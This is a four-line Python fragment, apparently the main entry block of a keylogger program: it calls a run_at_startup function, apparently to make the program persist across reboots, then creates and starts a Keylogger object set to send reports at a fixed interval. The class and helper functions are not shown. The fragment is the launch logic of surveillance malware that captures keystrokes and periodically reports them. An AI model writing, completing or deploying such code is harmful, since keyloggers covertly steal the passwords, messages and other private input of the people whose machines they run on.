if __name__ == "__main__":
    run_at_startup()
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()